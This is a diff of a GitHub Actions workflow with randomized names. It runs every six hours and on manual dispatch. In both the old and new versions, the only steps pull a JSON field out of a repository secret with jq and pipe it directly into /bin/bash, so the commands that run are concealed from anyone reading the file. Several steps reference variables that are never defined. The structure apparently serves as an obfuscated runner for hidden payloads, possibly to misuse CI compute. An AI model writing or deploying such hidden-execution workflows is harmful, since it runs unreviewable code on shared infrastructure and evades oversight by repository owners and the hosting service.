@@ -1,29 +1,22 @@
 name: taoyebnx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 5/6 * * *'
-
-jobs:  # 31625
+    - cron: '59 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: taoyebnx
         env:
-          rhscn91: ${{ secrets.rhscn91 }}
+          lln78: ${{ secrets.lln78 }}
         run: |
-          echo $rhscn91 | jq -r .ixdhd0642 | /bin/bash
-          echo $ukz6113 | jq -r .mbo82872 | /bin/bash
-          echo $qzzqm6 | jq -r .cfa8 | /bin/bash
-          echo $hlb6 | jq -r .d89044 | /bin/bash
-          echo $y01 | jq -r .b545 | /bin/bash
-          echo $vy1 | jq -r .ylpza181 | /bin/bash
-          echo $gisn59896 | jq -r .ncb4666 | /bin/bash
-          echo $xzoo5 | jq -r .twx706 | /bin/bash
-          echo $dxa098 | jq -r .t6739 | /bin/bash
-          echo $ieba000 | jq -r .nh3 | /bin/bash
-          echo $rlkyb275 | jq -r .lqa290 | /bin/bash
-          echo $plxx479 | jq -r .r362 | /bin/bash
+          echo $lln78 | jq -r .pmonl0 | /bin/bash
+          echo $h3 | jq -r .iwrl286 | /bin/bash
+          echo $a1 | jq -r .xocep643 | /bin/bash
+          echo $o7 | jq -r .lcwvq65945 | /bin/bash
+          echo $pcu98 | jq -r .mwkb32 | /bin/bash
+          echo $dpbtx66 | jq -r .putyz0 | /bin/bash
 
